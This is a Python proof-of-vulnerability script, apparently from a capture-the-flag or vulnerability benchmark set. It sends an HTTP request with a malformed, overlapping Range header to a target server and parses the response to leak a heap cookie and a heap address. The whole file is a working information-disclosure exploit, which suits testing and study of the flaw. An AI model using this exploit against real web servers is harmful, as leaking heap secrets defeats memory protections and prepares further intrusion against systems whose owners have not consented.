import sys
import socket
import random
import time
import string
import base64
import os
import datetime
import string
import struct
import signal

pwd = ''
homedir = ''

def handler( signum, frame):
    print('[FAIL] sigalrm fired so the POV was likely unsuccessful')
    exit(0)

def randomstring(l):
    q = ''

    for _ in range(l):
        q += random.choice(string.ascii_lowercase)

    return q

def connect( ip, port ):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect( (ip, port) )
    except:
        print('Failed to connect to %s:%d' %(ip, port))
        sys.exit(1)

    return s

def RU( s, u ):
    z = ''

    try:
        while z.endswith( u ) == False:
            z += s.recv(1).decode('utf-8')
    except Exception as e:
        print('Failed to receive data')
        print(e)
        return None

    return z

def RL( s ):
    return RU( s, '\n')

def SW(s, data):
    #print data
    s.sendall(data)

def main():
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    else:
        if 'HOST' in os.environ and 'PORT' in os.environ:
            HOST = os.environ['HOST']
            PORT = int(os.environ['PORT'])
        else:
            print('[ERROR] HOST and PORT must be specified via arguments or variables.')
            sys.exit(1)

    signal.signal(signal.SIGALRM, handler)
    signal.alarm(10)
    
    p = connect( HOST, PORT )

    req = b'GET /index.html HTTP/1.1\r\n'
    req += b'Range: bytes=0-1000,5-0,0-5,0-5\r\n'
    req += b'Host: chess\r\n\r\n'

    SW(p, req)

    y = p.recv(2000)

    st = y.find(b'\x00\x00\x00\x00') + 4
    cookie_start = y[st:]

    cookie = struct.unpack('I', cookie_start[0:4])[0]

    print('[LEAK] Heap cookie: 0x%x' %(cookie))

    st = 8

    while st < len(cookie_start):
    	if cookie_start[st] != 0:
    		addr_leak = struct.unpack('Q', cookie_start[st:st+8])[0] & 0xffffffffffff
    		print('[LEAK] Heap Address: 0x%.8x' %(addr_leak))
    		p.close()
    		print('[SUCCESS] PoV completed successfully')
    		exit(0)
    	st += 1

    print('[FAIL] POV did not succeed')
    p.close()
    exit(1)

if __name__ == '__main__':
    main()
